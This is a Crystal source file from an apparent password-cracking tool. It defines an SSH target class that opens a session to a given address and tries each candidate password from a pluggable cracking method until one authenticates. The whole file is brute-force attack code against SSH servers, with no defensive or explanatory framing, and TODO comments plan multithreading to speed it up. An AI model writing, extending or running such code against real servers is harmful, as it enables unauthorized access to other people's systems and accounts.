require "ssh2"
require "socket"
require "./cracking_target.cr"
require "../methods/cracking_method.cr"

module Cracker::Target
	class SSH < CrackingTarget
		def initialize(@address : Socket::IPAddress, @username : String, @method : Cracker::Methods::CrackingMethod)
		end

		# TODO Multithreading (or multi-processing)
		def start_cracking
			SSH2::Session.open(@address.address, @address.port) do |session|
				# TODO better char array to str
				passwords = @method.crack

				passwords.each do |password|
					if self.correct_password? password, session
						return password
					end
				end
			end
		end

		private def correct_password?(password : String, session : SSH2::Session) : Bool
			session.login @username, password
			return session.authenticated?
		end
	end
end
